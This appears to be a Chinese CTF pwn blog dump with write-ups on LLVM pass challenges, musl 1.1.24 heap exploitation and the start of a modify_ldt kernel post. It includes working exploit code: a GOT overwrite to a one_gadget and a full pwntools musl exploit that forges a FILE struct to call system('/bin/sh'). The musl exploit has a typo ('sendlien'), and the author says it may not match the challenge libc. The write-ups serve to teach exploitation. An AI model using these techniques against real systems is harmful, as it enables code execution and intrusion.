v5[0] = llvm::Function::begin(a2);  while ( 1 )  &#123;    v4 = llvm::Function::end(a2);    if ( (llvm::operator!=(v5, &amp;v4) &amp; 1) == 0 )      break;    v3 = (llvm::BasicBlock *)llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,false&gt;::operator*(v5);    sub_6B80(a1, v3);    llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::BasicBlock,false,false,void&gt;,false,false&gt;::operator++(      v5,      0LL);  &#125;  return __readfsqword(0x28u);&#125;\n\n这里则是遍历函数中的每一个basicblock，取出之后进入sub_6b80函数进一步处理\nv39[1] = __readfsqword(0x28u);v39[0] = llvm::BasicBlock::begin(a2);while ( 1 )&#123;    v38 = llvm::BasicBlock::end(a2);    if ( (llvm::operator!=(v39, &amp;v38) &amp; 1) == 0 )        break;    v36 = (llvm::Instruction *)llvm::dyn_cast&lt;llvm::Instruction,llvm::ilist_iterator&lt;llvm::ilist_detail::node_options&lt;llvm::Instruction,false,false,void&gt;,false,false&gt;&gt;(v39);    if ( (unsigned int)llvm::Instruction::getOpcode(v36) == 0x37 )    &#123;        v35 = (llvm::CallBase *)llvm::dyn_cast&lt;llvm::CallInst,llvm::Instruction&gt;(v36);        if ( v35 )        &#123;            s1 = (char *)malloc(0x20uLL);            CalledFunction = (llvm::Value *)llvm::CallBase::getCalledFunction(v35);            Name = (_QWORD *)llvm::Value::getName(CalledFunction);            *(_QWORD *)s1 = *Name;            *((_QWORD *)s1 + 1) = Name[1];            *((_QWORD *)s1 + 2) = Name[2];            *((_QWORD *)s1 + 3) = Name[3];\n\n这里呢则是遍历basicblock中的每一个操作指令，后续就是类似于vm-pwn中对相应的指令做相应的处理。这里重点关注三段代码即可：\nelse if ( !strcmp(s1, &quot;store&quot;) )&#123;    if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 2 )    &#123;        v25 = llvm::CallBase::getArgOperand(v35, 0);        v24 = 0LL;        v23 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v25);        if ( v23 )        &#123;            v22 = llvm::ConstantInt::getZExtValue(v23);            if ( v22 == 1 )                v24 = REG1;            if ( v22 == 2 )                v24 = REG2;        &#125;        if ( v24 == REG1 )        &#123;            **(_QWORD **)REG1 = *(_QWORD *)REG2;        &#125;        else if ( v24 == REG2 )        &#123;            **(_QWORD **)REG2 = *(_QWORD *)REG1;        &#125;    &#125;&#125;\n\n这里可以看到指令为store时，通过第一个参数来决定下面是什么寄存器来进行赋值，如果我们可以操控寄存器也就可以实现任意地址写了。\nelse if ( !strcmp(s1, &quot;load&quot;) )&#123;    if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 2 )    &#123;        v21 = llvm::CallBase::getArgOperand(v35, 0);        v20 = 0LL;        v19 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v21);        if ( v19 )        &#123;            v18 = llvm::ConstantInt::getZExtValue(v19);            if ( v18 == 1 )                v20 = REG1;            if ( v18 == 2 )                v20 = REG2;        &#125;        if ( v20 == REG1 )            *(_QWORD *)REG2 = **(_QWORD **)REG1;        if ( v20 == REG2 )            *(_QWORD *)REG1 = **(_QWORD **)REG2;    &#125;&#125;\n\n根据上面同理，如果可以操控寄存器就可以任意地址读了\nelse if ( !strcmp(s1, &quot;add&quot;) )&#123;    if ( (unsigned int)llvm::CallBase::getNumOperands(v35) == 3 )    &#123;        v17 = llvm::CallBase::getArgOperand(v35, 0);        v16 = 0LL;        v15 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v17);        if ( v15 )        &#123;            v14 = llvm::ConstantInt::getZExtValue(v15);            if ( v14 == 1 )                v16 = REG1;            if ( v14 == 2 )                v16 = REG2;        &#125;        if ( v16 )        &#123;            v13 = llvm::CallBase::getArgOperand(v35, 1u);            v12 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(v13);            if ( v12 )                *v16 += llvm::ConstantInt::getZExtValue(v12);        &#125;    &#125;&#125;\n\n这里我们就可以控制寄存器了\n可以在上面看到，这里的指令是放在malloc出来的堆块上面的，并且程序的循环最后会free掉堆块，那么我们的思路就是修改free的got表为one_gadget\nexp:\nvoid store(int a);void load(int a);void add(int a, int b); void o0o0o0o0()&#123;    add(1, 0x77e100);    load(1);    add(2, 0x729ec);    store(1);&#125;\n\nSatool## IntroductionA LLVM Pass that can optimize add/sub instructions.## How to runopt-12 -load ./mbaPass.so -mba &#123;*.bc/*.ll&#125; -S## Example### IR before optimization```define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;  %2 = sub nsw i64 %0, 2  %3 = add nsw i64 %2, 68  %4 = add nsw i64 %0, 6  %5 = add nsw i64 %4, -204  %6 = add nsw i64 %5, %3  ret i64 %6&#125;```### IR after optimization```define dso_local i64 @foo(i64 %0) local_unnamed_addr #0 &#123;  %2 = mul i64 %0, 2  %3 = add i64 %2, -132  ret i64 %3&#125;```\n\n首先看题目的readme文件，可以从before和after的对比看出来这里做的是压缩优化IR指令，并且限制了只能是sub或者add或者ret\n\n可以看到这道题的runOnFunction更是直接给了出来\nv30 = this;v29 = a2;v28 = 0;v2 = a2;if ( llvm::Function::arg_size(a2) != 1 || (v2 = v29, llvm::Function::size(v29) != 1) )&#123;    v3 = llvm::errs(v2);    llvm::raw_ostream::operator&lt;&lt;(v3, &quot;Function has more than one argument or basicblock\\n&quot;);    exit(-1);&#125;this[5] = this[4];mprotect(this[4], 0x1000uLL, 3);`anonymous namespace&#x27;::MBAPass::handle((_anonymous_namespace_::MBAPass *)this, v29);    mprotect(this[4], 0x1000uLL, 5);v27 = `anonymous namespace&#x27;::MBAPass::callCode((_anonymous_namespace_::MBAPass *)this);\n\n可以看到函数的开始验证了参数和基本块只允许有一个，然后通过handle函数之后执行callCode函数，并且在handle处理之前内存的权限为可读可写，随后改为了可读可执行。\n__int64 __fastcall `anonymous namespace&#x27;::MBAPass::callCode(        __int64 (__fastcall **this)(_anonymous_namespace_::MBAPass *, __int64),        __int64 a2)&#123;  return this[4]((_anonymous_namespace_::MBAPass *)this, a2);&#125;\n\n可以看到callCode函数是将this[4]直接执行，那么意思很明显就是写shellcode。所以重点还是需要看handle函数\nv32 = this;v31 = a2;v30 = *((_QWORD *)this + 4) + 0xFF0LL;v29 = (llvm::BasicBlock *)llvm::Function::front(a2);Terminator = (llvm::User *)llvm::BasicBlock::getTerminator(v29);Operand = llvm::User::getOperand(Terminator, 0);if ( (llvm::isa&lt;llvm::Constant,llvm::Value *&gt;(&amp;Operand) &amp; 1) != 0 )&#123;    *((_DWORD *)this + 12) = 0;    v2 = (llvm::ConstantInt *)llvm::dyn_cast&lt;llvm::ConstantInt,llvm::Value&gt;(Operand);    SExtValue = llvm::ConstantInt::getSExtValue(v2);    `anonymous namespace&#x27;::MBAPass::writeMovImm64(this, 0, SExtValue);        return `anonymous namespace&#x27;::MBAPass::writeRet(this);&#125;else if ( (llvm::isa&lt;llvm::Argument,llvm::Value *&gt;((__int64)&amp;Operand) &amp; 1) != 0 )&#123;    *((_DWORD *)this + 12) = 1;    `anonymous namespace&#x27;::MBAPass::writeMovImm64(this, 0, 0LL);        return `anonymous namespace&#x27;::MBAPass::writeRet(this);&#125;else&#123;    `anonymous namespace&#x27;::MBAPass::writeMovImm64(this, 0, 0LL);        *((_DWORD *)this + 12) = 0;    std::stack&lt;llvm::Value *&gt;::stack&lt;std::deque&lt;llvm::Value *&gt;,void&gt;(v26);    std::stack&lt;int&gt;::stack&lt;std::deque&lt;int&gt;,void&gt;(v25);    std::stack&lt;llvm::Value *&gt;::push(v26, &amp;Operand);    v24 = 1;    std::stack&lt;int&gt;::push(v25, &amp;v24);    while ( *((_QWORD *)this + 5) &lt; v30 )    &#123;        if ( !std::stack&lt;llvm::Value *&gt;::size(v26) )        &#123;            `anonymous namespace&#x27;::MBAPass::writeRet(this);                break;        &#125;\n\n并且这里根据handle的处理可以看出来是将v30当作结束地址，再看一下比较重要的几个函数\n_anonymous_namespace_::MBAPass *__fastcall `anonymous namespace&#x27;::MBAPass::writeMovImm64(        _anonymous_namespace_::MBAPass *this,        int a2,        __int64 a3)&#123;  _anonymous_namespace_::MBAPass *result; // rax  **((_BYTE **)this + 5) = 0x48;  if ( a2 )    *(_BYTE *)(*((_QWORD *)this + 5) + 1LL) = 0xBB;  else    *(_BYTE *)(*((_QWORD *)this + 5) + 1LL) = 0xB8;  result = this;  *(_QWORD *)(*((_QWORD *)this + 5) + 2LL) = a3;  *((_QWORD *)this + 5) += 10LL;  return result;&#125;\n\n可以看到这里其实就是写shellcode\n&gt;&gt;&gt; test=b&#x27;\\x48\\xbb\\xfe\\xdc\\xba\\x98\\x76\\x54\\x32\\x10&#x27;&gt;&gt;&gt; disasm(test)&#x27;   0:   48 bb fe dc ba 98 76 54 32 10   movabs rbx, 0x1032547698badcfe&#x27;&gt;&gt;&gt;\n\n但是这里的漏洞点是在handle函数中将this[4]+0xff0当作了结束的位置，所以还存在0x10是我们可写的，所以我们通过借位的思想来书写shellcode\n在正常情况下执行：\n\n我们是可以顺利执行结束的\n那如果第二次我们的指令刚好到达0xff0执行完毕就会出现以下情况：\n\n 这里就会接着跳转回去，随后我们每次可控的内容只有八个字节，所以后续就是分片的思想通过jmp指令连接起我们的shellcode\n讲两句：这司马难度的shellcode确定是想我们比赛的时候来做吗？\nexp略长，需要的 https://github.com/196082/196082 自取\n\n参考链接：https://bbs.pediy.com/thread-273119.htm#msg_header_h1_3\n","categories":["pwn"],"tags":["llvm pass"]},{"title":"musl 1.1.24利用方式","url":"/2022/04/27/musl-1-1-24%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F/","content":"这个月干的是属实有点儿少，感觉特别迷茫，学了那么多结果比赛还是一头雾水，虽然很烦躁但是还是不能放弃啊！\n在starCTF的第二道题我始终找不到漏洞点在哪，下来看wp才发现使用的libc不是普通的glibc了，其实在RCTF的一道题目就是基于musl的但是无奈github的仓库当中并没有题目的源码所以没去深入了解，在starCTF过后也算是了解一下这一相较于glic更为轻量的libc了。\n首先本文先介绍一下这一libc\nmusl 1.1.24musl libc 是一个专门为嵌入式系统开发的轻量级 libc 库，以简单、轻量和高效率为特色。有不少 Linux 发行版将其设为默认的 libc 库，用来代替体积臃肿的 glibc ，如 Alpine Linux（做过 Docker 镜像的应该很熟悉）、OpenWrt（常用于路由器）和 Gentoo 等。\n数据结构这一版本的chunk结构其实是和glibc相差不大的。\nstruct chunk &#123;    size_t psize, csize;     struct chunk *next, *prev;&#125;;\n\npsize和csize字段都有标志位（glibc 只有size字段有），但只有一种位于最低位的标志位INUSE（glibc 最低三位都有标志位）。若设置INUSE标志位（最低位为1），表示 chunk 正在被使用；若没有设置INUSE标志位（最低位为0），表示 chunk 已经被释放或者通过mmap分配的，需要通过psize的标志位来进一步判断 chunk 的状态。\nstatic struct &#123;    volatile uint64_t binmap;    struct bin bins[64];    volatile int free_lock[2];&#125; mal;\n\n这个mal结构体很类似main_arena，里面记录着堆的信息，有三个成员：64位无符号整数binmap、链表头部数组bins和锁free_lock。binmap记录每个 bin 是否为非空，若某个比特位为 1，表示对应的 bin 为非空，即 bin 链表中有 chunk。\nstruct bin &#123;    volatile int lock[2];    struct chunk *head;    struct chunk *tail;&#125;;\n\nbin 链表头部的结构如上。head和tail指针分别指向首部和尾部的 chunk，同时首部 chunk 的prev指针和尾部 chunk 的next指针指向 bin 链表头部，这样构成了循环链表。当链表为空时，head和tail指针等于 0 或者指向链表头部自身。\n看mal结构可以看到有64的bin，前面32个bin是类似于small bin的结构，存放的chunk的大小是固定的，但是后面的就类似于large bin存放的是在一定范围的chunk了。\nmalloc// src/malloc/malloc.c L284-L331void *malloc(size_t n)&#123;    struct chunk *c;    int i, j;    // 1. n 增加头部长度 OVERHEAD (0x10)，对齐 32 位：    // *n = (*n + OVERHEAD + SIZE_ALIGN - 1) &amp; SIZE_MASK;    if (adjust_size(&amp;n) &lt; 0) return 0;    // 若 n 到达 MMAP_THRESHOLD (0x38000)，使用 mmap chunk    if (n &gt; MMAP_THRESHOLD) &#123;        [...]        return CHUNK_TO_MEM(c);    &#125;    // 2. 计算 n 对应的 bin 下标 i    i = bin_index_up(n);    for (;;) &#123;        // 3. 查找 binmap        uint64_t mask = mal.binmap &amp; -(1ULL&lt;&lt;i);        // 若所有的可用 bin 均为空，调用 expand_heap 函数延展堆空间，生成新的 chunk        if (!mask) &#123;            c = expand_heap(n);            [...]            break;        &#125;        // 4. 获取大小最接近 n 的可用 bin 下标 j        j = first_set(mask);        lock_bin(j);        c = mal.bins[j].head; // c 是 bin j 链表首部的 chunk        // 5. 若符合条件，使用 pretrim 分割 c，否则使用 unbin 从链表中取出 c        if (c != BIN_TO_CHUNK(j)) &#123;            if (!pretrim(c, n, i, j)) unbin(c, j);            unlock_bin(j);            break;        unlock_bin(j);    &#125;    // 6. 回收 c 中大小超过 n 的部分    /* Now patch up in case we over-allocated */    trim(c, n);    return CHUNK_TO_MEM(c);&#125;\n\n大概步骤就是：\n\n调整n，增加头部的长度然后对齐32位\n\n如果n&gt;MMAP_THRESHOLD，则使用mmap创建一块大小为n的内存返回\n\n如果n&lt;=MMAP_THRESHOLD，计算n对应的bin的i，查找binmap\n​    如果所有可用bin都为空，那么就扩展堆空间，生存一个新的chunk\n​    如果存在非空的bin，则大小最接近n的bin，将bin首部的chunk返回\n​        如果符号pretrime条件，使用pretrime分割\n​        否则使用unbin从链表中取出\n​    最后对chunk进行trim，返回给用户\n\n\nstatic void unbin(struct chunk *c, int i)&#123;    // 若 bin 只有一个 chunk，将 bin 设为空 bin    if (c-&gt;prev == c-&gt;next)        a_and_64(&amp;mal.binmap, ~(1ULL&lt;&lt;i));    // 取出链表中的 chunk    c-&gt;prev-&gt;next = c-&gt;next;    c-&gt;next-&gt;prev = c-&gt;prev;    // 设置 INUSE 标志位    c-&gt;csize |= C_INUSE;    NEXT_CHUNK(c)-&gt;psize |= C_INUSE;&#125;\n\n这其实就是取出chunk的一个操作，可以看到取出的过程中并没有检测chunk指针的合法性，这也就造成了安全隐患\nstatic int pretrim(struct chunk *self, size_t n, int i, int j)&#123;    size_t n1;    struct chunk *next, *split;    // 条件 1: bin j 下标大于 40    /* We cannot pretrim if it would require re-binning. */    if (j &lt; 40) return 0;    // 条件 2: bin j 与 i 相隔 3 个 bin 或以上，    // 或者 j 等于 63 且 split 的大小大于 MMAP_THRESHOLD    if (j &lt; i+3) &#123;        if (j != 63) return 0;        n1 = CHUNK_SIZE(self);        if (n1-n &lt;= MMAP_THRESHOLD) return 0;    &#125; else &#123;        n1 = CHUNK_SIZE(self);    &#125;    // 条件 3: split 的大小属于 bin j 范围内，即 split 与 self 属于同一个 bin    if (bin_index(n1-n) != j) return 0;    // 切割出一块大小为 n 的 chunk    next = NEXT_CHUNK(self);    split = (void *)((char *)self + n);    split-&gt;prev = self-&gt;prev;    split-&gt;next = self-&gt;next;    split-&gt;prev-&gt;next = split;    split-&gt;next-&gt;prev = split;    split-&gt;psize = n | C_INUSE;    split-&gt;csize = n1-n;    next-&gt;psize = n1-n;    self-&gt;csize = n | C_INUSE;    return 1;&#125;\n\npretrim的作用是切割大 chunk，防止把大小超过需求的 chunk 分配给用户。当满足一定条件时，pretrim从 bin 链表首部 chunk 切割出一块大小刚好符合需求的小 chunk，然后将小 chunk 分配给用户，链表首部 chunk 的位置保持不变。\nstatic void trim(struct chunk *self, size_t n)&#123;    size_t n1 = CHUNK_SIZE(self);    struct chunk *next, *split;    // 条件：self 的大小 n1 多于 n DONTCARE (0x10) 字节    if (n &gt;= n1 - DONTCARE) return;    // 将 self 的大小切割为 n，剩余部分成为新的 chunk split    next = NEXT_CHUNK(self);    split = (void *)((char *)self + n);    split-&gt;psize = n | C_INUSE;    split-&gt;csize = n1-n | C_INUSE;    next-&gt;psize = n1-n | C_INUSE;    self-&gt;csize = n | C_INUSE;    // 将 split 释放到 bin    __bin_chunk(split);&#125;\n\nmalloc 的最后一步是trim，主要作用是回收 chunk 超过需求大小的部分。trim将 chunk 多余的部分切割出来，然后将其释放到 bin 中，减少内存浪费。\nfreevoid free(void *p)&#123;    if (!p) return;    struct chunk *self = MEM_TO_CHUNK(p);    // 若 csize 没有设置 INUSE 标志位，检查是否为 mmap chunk 或者 double free    // #define IS_MMAPPED(c) !((c)-&gt;csize &amp; (C_INUSE))    if (IS_MMAPPED(self))        unmap_chunk(self);    else        __bin_chunk(self);&#125;\n\nstatic void unmap_chunk(struct chunk *self)&#123;    size_t extra = self-&gt;psize;    char *base = (char *)self - extra;    size_t len = CHUNK_SIZE(self) + extra;    // 若 prev size 设置了 INUSE 标志位，视为 double free，crash    /* Crash on double free */    if (extra &amp; 1) a_crash();    __munmap(base, len);&#125;\n\nfree 先对 chunk 进行 mmap / double free 检查。如果 chunk 的csize字段没有设置INUSE标志位，进入unmap_chunk函数检查psize字段。如果psize字段设置了INUSE标志位，视为 double free，crash；否则视为 mmap chunk，调用__munmap函数释放。\nvoid __bin_chunk(struct chunk *self)&#123;    struct chunk *next = NEXT_CHUNK(self);    size_t final_size, new_size, size;    int reclaim=0;    int i;    // new_size 是 self 原来的大小，final_size 是 self 合并空闲 chunk 后的大小    final_size = new_size = CHUNK_SIZE(self);    // 若下一个 chunk 的 psize 不等于 self 的 csize，则 crash    /* Crash on corrupted footer (likely from buffer overflow) */    if (next-&gt;psize != self-&gt;csize) a_crash();    // 1. 检查 self 前后是否有空闲 chunk    for (;;) &#123;        if (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE) &#123;            // 去除 INUSE 标志位            self-&gt;csize = final_size | C_INUSE;            next-&gt;psize = final_size | C_INUSE;            // 计算 final_size 对应的 bin 下标 i            i = bin_index(final_size);            lock_bin(i);            lock(mal.free_lock);            if (self-&gt;psize &amp; next-&gt;csize &amp; C_INUSE)                break;  // 退出循环            unlock(mal.free_lock);            unlock_bin(i);        &#125;        // 向前合并空闲 chunk        if (alloc_rev(self)) &#123;  // 从 bin 链表取出待合并的空闲 chunk            self = PREV_CHUNK(self);            size = CHUNK_SIZE(self);            final_size += size;            if (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)                reclaim = 1;        &#125;        // 向后合并空闲 chunk        if (alloc_fwd(next)) &#123;  // 从 bin 链表取出待合并的空闲 chunk            size = CHUNK_SIZE(next);            final_size += size;            if (new_size+size &gt; RECLAIM &amp;&amp; (new_size+size^size) &gt; size)                reclaim = 1;            next = NEXT_CHUNK(next);        &#125;    &#125;    //2. 在 binmap 中，将 bin i 设为非空 bin    if (!(mal.binmap &amp; 1ULL&lt;&lt;i))        a_or_64(&amp;mal.binmap, 1ULL&lt;&lt;i);    self-&gt;csize = final_size;    next-&gt;psize = final_size;    unlock(mal.free_lock);    // 3. 将 self 加入到 bin i 链表的尾部    self-&gt;next = BIN_TO_CHUNK(i);    self-&gt;prev = mal.bins[i].tail;    self-&gt;next-&gt;prev = self;    self-&gt;prev-&gt;next = self;    /* Replace middle of large chunks with fresh zero pages */    if (reclaim) &#123;        [...]    &#125;    unlock_bin(i);&#125;\n\n__bin_chunk函数的作用是将 chunk 插入到 bin 链表中。首先合并 chunk 前后的空闲 chunk、设置 binmap 和 chunk 标志位，最后将 chunk 插入到对应的 bin 链表中。\n然后在musl当中的堆管理为了减少内存的使用会直接将libc和程序当中的空闲的内存当作堆内存，而glibc的堆地址一般都是位于内存中的动态内存区域。\nXCTF_2020_PWN_musl\n可以看到这里确实是直接在libc和process上面有堆的地址。\n题目分析就是很经典的菜单题，并且在create函数里面有一处只能运行一次的0x50的溢出，而且题目只有一处使用exit退出程序，然后show函数也只有一次。\n利用分析其实利用思路就很简单了，存在溢出，unbin又有如此大的安全隐患，所以就是通过溢出修改掉next指针和prev指针从而实现任意地址写，造成FSOP\n这里说一下怎么造成的FSOP\n_Noreturn void exit(int code)&#123;\t__funcs_on_exit();\t__libc_exit_fini();\t__stdio_exit();\t_Exit(code);&#125;\n\nstatic void close_file(FILE *f)&#123;\tif (!f) return;\tFFINALLOCK(f);\tif (f-&gt;wpos != f-&gt;wbase) f-&gt;write(f, 0, 0);\tif (f-&gt;rpos != f-&gt;rend) f-&gt;seek(f, f-&gt;rpos-f-&gt;rend, SEEK_CUR);&#125;void __stdio_exit(void)&#123;\tFILE *f;\tfor (f=*__ofl_lock(); f; f=f-&gt;next) close_file(f);\tclose_file(__stdin_used);\tclose_file(__stdout_used);\tclose_file(__stderr_used);&#125;\n\n可以看到最后是有机会调用到file的内部函数指针的\nstruct _IO_FILE &#123;\tunsigned flags;\tunsigned char *rpos, *rend;\tint (*close)(FILE *);\tunsigned char *wend, *wpos;\tunsigned char *mustbezero_1;\tunsigned char *wbase;\tsize_t (*read)(FILE *, unsigned char *, size_t);\tsize_t (*write)(FILE *, const unsigned char *, size_t);\toff_t (*seek)(FILE *, off_t, int);\tunsigned char *buf;\tsize_t buf_size;\tFILE *prev, *next;\tint fd;\tint pipe_pid;\tlong lockcount;\tint mode;\tvolatile int lock;\tint lbf;\tvoid *cookie;\toff_t off;\tchar *getln_buf;\tvoid *mustbezero_2;\tunsigned char *shend;\toff_t shlim, shcnt;\tFILE *prev_locked, *next_locked;\tstruct __locale_struct *locale;&#125;;\n\n所以我们需要利用exit来执行FSOP，不过难点就是怎么运行到exit，因为需要malloc返回一个0xdeadbeef，在上面可以看到，如果所有的bin都为空，此时malloc就会调用expand_heap来扩展堆，本质还是调用了__expand_heap函数\nvoid *__expand_heap(size_t *pn)&#123;\tstatic uintptr_t brk;\tstatic unsigned mmap_step;\tsize_t n = *pn;\tif (n &gt; SIZE_MAX/2 - PAGE_SIZE) &#123;\t\terrno = ENOMEM;\t\treturn 0;\t&#125;\tn += -n &amp; PAGE_SIZE-1;\tif (!brk) &#123;\t\tbrk = __syscall(SYS_brk, 0);\t\tbrk += -brk &amp; PAGE_SIZE-1;\t&#125;\tif (n &lt; SIZE_MAX-brk &amp;&amp; !traverses_stack_p(brk, brk+n)\t    &amp;&amp; __syscall(SYS_brk, brk+n)==brk+n) &#123;\t\t*pn = n;\t\tbrk += n;\t\treturn (void *)(brk-n);\t&#125;\tsize_t min = (size_t)PAGE_SIZE &lt;&lt; mmap_step/2;\tif (n &lt; min) n = min;\tvoid *area = __mmap(0, n, PROT_READ|PROT_WRITE,\t\tMAP_PRIVATE|MAP_ANONYMOUS, -1, 0);\tif (area == MAP_FAILED) return 0;\t*pn = n;\tmmap_step++;\treturn area;&#125;\n\n在__expand_heap函数中，brk是指向数据段末尾位置的指针。__expand_heap函数调用 brk 系统调用__syscall(SYS_brk, brk+n)，将数据段末尾向后延展n字节，然后延展部分返回给malloc作为新的 chunk 分配给用户\n若程序不开启 PIE，数据段的地址长度为 24 bit（0~0x2000000），内存位置与0xBADBEEF比较接近。若将brk指针修改为0xBADBEEF - n，brk 系统调用就会把数据段延展至0xBADBEEF，使其成为可访问的内存地址。\nexpfrom pwn import *elf = ELF(&#x27;./carbon&#x27;)# r = process([&#x27;./libc.so&#x27;, &#x27;carbon&#x27;])# libc = ELF(&#x27;./libc.so&#x27;)# r = process([&#x27;/ctf/work/download/libc.so&#x27;, &#x27;./carbon&#x27;])# libc = ELF(&#x27;/ctf/work/download/libc.so&#x27;)r = process([&#x27;../../libc/libc1.1.24.so&#x27;, &#x27;./carbon&#x27;])libc = ELF(&#x27;../../libc/libc1.1.24.so&#x27;)context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]def menu(option):    r.recvuntil(b&#x27;&gt; &#x27;)    r.sendline(bytes(str(option), encoding=&#x27;utf8&#x27;))def create(size, believer, content):    menu(1)    r.recvuntil(b&#x27;What is your prefer size? &gt;&#x27;)    r.sendline(bytes(str(size), encoding=&#x27;utf8&#x27;))    r.recvuntil(b&#x27;Are you a believer? &gt;&#x27;)    r.sendline(believer)    r.recvuntil(b&#x27;Say hello to your new sleeve &gt;&#x27;)    r.send(content)def delete(idx):    menu(2)    r.recvuntil(b&#x27;What is your sleeve ID? &gt;&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))def edit(idx, content):    menu(3)    r.recvuntil(b&#x27;What is your sleeve ID? &gt;&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))    r.send(content)def show(idx):    menu(4)    r.recvuntil(b&#x27;What is your sleeve ID? &gt;&#x27;)    r.sendline(bytes(str(idx), encoding=&#x27;utf8&#x27;))context.log_level = &#x27;debug&#x27;context.arch = &#x27;amd64&#x27;create(0x1, b&#x27;N&#x27;, b&#x27;a&#x27;)show(0)libc_base = u64(r.recvuntil(b&#x27;Done.&#x27;, drop=True).ljust(8, b&#x27;\\x00&#x27;)) - 0x29de61print(&#x27;libc_base=&gt;&#x27;, hex(libc_base))bin_addr = libc_base + 0x29de00 - 0x8stdin_addr = libc_base + libc.symbols[&#x27;__stdin_FILE&#x27;]system_addr = libc_base + libc.symbols[&#x27;system&#x27;]binmap_addr = libc_base + 0x29da80brk_addr = libc_base + libc.symbols[&#x27;brk&#x27;]create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 1create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 2create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 3create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 4create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 5create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 6create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 7create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 8delete(1)delete(3)payload = b&#x27;a&#x27; * 0x10payload += p64(0x21) + p64(0x21) + b&#x27;a&#x27; * 0x10payload += p64(0x21) + p64(0x20) + p64(stdin_addr -                                       0x10) + p64(stdin_addr -                                                   0x10) + p8(0x20)create(0x10, b&#x27;Y&#x27;, payload + b&#x27;\\n&#x27;)  # 1create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 3delete(5)edit(3, flat(stdin_addr - 0x10, bin_addr))create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 5file_struct = b&#x27;/bin/sh\\x00&#x27; + b&#x27;a&#x27; * 0x20file_struct += p64(0) * 2 + p64(1) * 2 + p64(system_addr)create(0x50, b&#x27;N&#x27;, b&#x27;\\n&#x27;)  # 9delete(7)edit(3, flat(brk_addr - 0x10, brk_addr - 0x10))create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 7delete(1)edit(3, flat(binmap_addr - 0x10, binmap_addr - 0x10))create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 1delete(7)edit(3, flat(binmap_addr - 0x10, bin_addr))create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 7create(0x50, b&#x27;N&#x27;, b&#x27;\\n&#x27;)  # 10delete(1)edit(3, flat(brk_addr - 0x10, bin_addr))create(0x10, b&#x27;N&#x27;, b&#x27;a&#x27; * 0x10)  # 1create(0x50, b&#x27;N&#x27;, b&#x27;\\n&#x27;)  # 11edit(9, file_struct)edit(11, p64(0xbadbeef - 0x20) + b&#x27;\\n&#x27;)edit(10, b&#x27;a&#x27; * 0x10 + p64(0) + b&#x27;\\n&#x27;)r.recvuntil(b&quot;&gt;&quot;)r.sendlien(b&#x27;1&#x27;)r.recvuntil(b&#x27;What is your prefer size? &gt;&#x27;)r.sendline(b&#x27;0&#x27;)r.interactive()\n\n然后就是我这里的libc是自己编译的和题目一直有出入，所以我这个exp可能不能直接用在题目上，同时我也问了其他师傅这个编译该怎么办，还在等回复~\n\n参考链接：https://www.anquanke.com/post/id/202253%23h2-4#h3-14\n","categories":["pwn"],"tags":["musl"]},{"title":"modify_ldt利用","url":"/2022/08/14/modify-ldt%E5%88%A9%E7%94%A8/","content":"在内核的堆题目中，如果不存在读取数据的函数可能是毫无头绪，因为堆块即便是free之后储存的也只是堆地址，这也没办法进行partial write等操作。那么在面对没有读取函数的情况下应该采取什么方法呢？\n利用原理linux存在这样一个系统调用叫做modify_ldt，我们可以通过他获取或者修改当前进程的LDT\nSYSCALL_DEFINE3(modify_ldt, int , func , void __user * , ptr ,                unsigned long , bytecount)&#123;    int ret = -ENOSYS;    switch (func) &#123;        case 0:            ret = read_ldt(ptr, bytecount);            break;        case 1:            ret = write_ldt(ptr, bytecount, 1);            break;        case 2:            ret = read_default_ldt(ptr, bytecount);            break;        case 0x11:            ret = write_ldt(ptr, bytecount, 0);            break;    &#125;    /*     * The SYSCALL_DEFINE() macros give us an &#x27;unsigned long&#x27;     * return type, but tht ABI for sys_modify_ldt() expects     * &#x27;int&#x27;.  This cast gives us an int-sized value in %rax     * for the return code.  The &#x27;unsigned&#x27; is necessary so     * the compiler does not try to sign-extend the negative     * return codes into the high half of the register when     * taking the value from int-&gt;long.     */    return (unsigned int)ret;&#125;\n\n可以看到这里传入的参数有三个，分别是func，ptr，bytecount，其中ptr指针应该指向的是user_desc结构体\nstruct user_desc &#123;    unsigned int  entry_number;    unsigned int  base_addr;    unsigned int  limit;    unsigned int  seg_32bit:1;    unsigned int  contents:2;    unsigned int  read_exec_only:1;    unsigned int  limit_in_pages:1;    unsigned int  seg_not_present:1;    unsigned int  useable:1;&#125;;\n\nstatic int read_ldt(void __user *ptr, unsigned long bytecount)&#123;    struct mm_struct *mm = current-&gt;mm;    unsigned long entries_size;    int retval;    